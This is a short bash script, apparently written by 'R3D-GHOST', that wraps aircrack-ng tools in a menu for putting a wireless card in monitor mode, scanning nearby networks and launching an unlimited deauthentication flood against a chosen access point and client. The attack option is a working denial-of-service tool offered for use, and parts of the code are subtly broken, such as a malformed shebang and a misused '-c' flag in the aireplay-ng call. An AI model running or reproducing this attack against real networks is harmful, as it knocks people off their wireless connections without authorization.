#/bin/bash/
figlet WIFI-ATTACK
echo "By R3D-GHOST"
echo "1"
echo "2"
sleep 1
echo "3"
echo "Iniciando wifi attack by r3dghost"
sleep 1
clear
#meni de Opcines 
figlet WIFI-ATTACK
echo "[1] Start Modo monitor"
echo "[2] Stop Modo monitor"+
echo "[3] Scan Wifi"
echo "[4] Attack Wifi"
echo "[5] Exit"
read -p "Options :" Opcines_menu
#Opcines del menu 
if [ $Opcines_menu = 1 ]; then
sudo airmon-ng check kill
clear
iwconfig
read -p "Select your network card :" tarjeta_red
sleep 1
sudo airmon-ng start $tarjeta_red
sleep 1
clear
bash wifi_auto.sh
echo "Monitor mode Start/ON"
elif [ $Opcines_menu = 2 ]; then
clear
iwconfig
read -p "Select your network card :" stop_red
sudo airmon-ng stop $stop_red
clear
echo "Monitor mode Stop/OFF"
bash wifi_auto.sh
elif [ $Opcines_menu = 3 ]; then
echo "Starting Wifi Scan"
sleep 1
clear
echo "To exit Press CTRL + C to exit"
sleep 3
iwconfig
read -p "Select your network card :" scan_red
echo "Starting"
sleep 2
sudo airodump-ng $scan_red
bash wifi_auto.sh
elif [ $Opcines_menu = 4 ]; then
clear
figlet WIFI-DDOS
read -p "CHANNEL OF TARGET: " channel
read -p "ACCES POINT TARGET MAC: " mac_ap
read -p "CLIENT TARGET MAC: " mac_cliente
read -p "SELECT YOUR NETWORK CARD" card_tj
aireplay-ng --deauth 0 -c $channel -a $mac_ap -c $mac_cliente $card_tj
bash wifi_auto.sh
elif [ $Opcines_menu = 5 ]; then
exit 0
else 
    echo "Invalid option, please select a valid option"
fi